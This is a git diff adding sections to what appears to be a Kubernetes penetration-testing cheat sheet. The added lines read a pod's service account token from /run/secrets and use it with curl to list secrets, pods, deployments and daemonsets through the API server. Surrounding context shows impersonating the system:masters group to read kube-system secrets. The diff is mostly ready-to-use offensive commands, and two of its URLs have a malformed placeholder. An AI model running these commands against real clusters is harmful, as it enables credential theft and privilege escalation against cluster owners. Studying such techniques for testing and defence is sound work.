@@ -12,6 +12,8 @@
     - [Privilege to Use Pods/Exec](#privilege-to-use-pods-exec)
     - [Privilege to Get/Patch Rolebindings](#privilege-to-get-patch-rolebindings)
     - [Impersonating a Privileged Account](#impersonating-a-privileged-account)
+- [Privileged Service Account Token](#privileged-service-account-token)
+- [Interesting endpoints to reach](#interesting-endpoints-to-reach)
 - [API addresses that you should know](#api-adresses-that-you-should-know)
 - [References](#references)
 
@@ -109,6 +111,29 @@ curl -k -v -X POST -H "Authorization: Bearer <COMPROMISED JWT TOKEN>" -H "Conten
 
 ```powershell
 curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" -H "Impersonate-Group: system:masters" -H "Impersonate-User: null" -H "Accept: application/json" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
+```
+
+## Privileged Service Account Token
+
+```powershell
+$ cat /run/secrets/kubernetes.io/serviceaccount/token
+$ curl -k -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/default/secrets/
+```
+
+## Interesting endpoints to reach
+
+```powershell
+# List Pods
+curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/default/pods/
+
+# List secrets
+curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/default/secrets/
+
+# List deployments
+curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip:<port>/apis/extensions/v1beta1/namespaces/default/deployments
+
+# List daemonsets
+curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip:<port>/apis/extensions/v1beta1/namespaces/default/daemonsets
 ```
 
 
